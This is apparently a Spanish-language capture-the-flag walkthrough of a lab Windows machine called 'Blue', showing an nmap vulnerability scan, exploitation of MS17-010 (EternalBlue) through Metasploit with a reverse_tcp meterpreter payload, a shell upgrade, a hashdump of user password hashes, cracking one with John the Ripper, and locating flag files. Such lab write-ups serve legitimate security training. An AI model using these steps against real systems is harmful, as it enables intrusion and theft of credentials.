# Blue

Máquina donde aprenderemos a atacar a máquina Windows mediante vulnerabilidades como la ms17_010 y haremos uso de eternalblue y modulos shell_to_meterpreter.

## ESCANEO DE PUERTOS

![](screenshots/01.png)

Realizamos una búsqueda de vulnerabilidades

`nmap -p445,139,135 -sV --script="vuln" 10.129.163.182`

![](screenshots/02.png)

Observamos la siguiente vulnerabilidad ms17-010

## ENUMERACIÓN DE EXPLOIT

Desde metasploit buscaremos esta vulnerabilidad y probaremos cual nos resulta exitosa.

![](screenshots/03.png)

Usamos el primer exploit

y le introducimos los RHOSTS Y LHOST

![](screenshots/04.png)

Tras tener algunos problemas cambiamos los siguientes parametros

`set PAYLOAD windows/x64/meterpreter/reverse_tcp`

`set LPORT 443`

`run`

Teniamos un payload x86 vs x64 de la victima.

Ahora ponemos la sesión en segundo plano con background.

## ESCALADA DE PRIVILEGIOS

Buscamos pasar una shell a meterpreter con el siguiente payload.

![](screenshots/05.png)

Nos pide la sesión que tenemos activa.

![](screenshots/06.png)

Una vez lanzado se nos creará 2 sesiones.

![](screenshots/07.png)

Entramos así en la nueva

Comprobamos que hemos escalado a la autoridad del sistema

![](screenshots/08.png)

Con hashdump veremos los hashes de los usuarios

![](screenshots/09.png)

Guardamos en un hash.txt el hash de Jon y con John the Ripper lo desciframos

![](screenshots/10.png)

Desde meterpreter encontramos la flag1

![](screenshots/11.png)

Posteriormente la flag2 y flag3 la buscaremos usando search:

`search -f flag2.txt`

`search -f flag3.txt`

![](screenshots/12.png)

![](screenshots/13.png)

Ya solo vamos a esas rutas y encontraremos las flags.
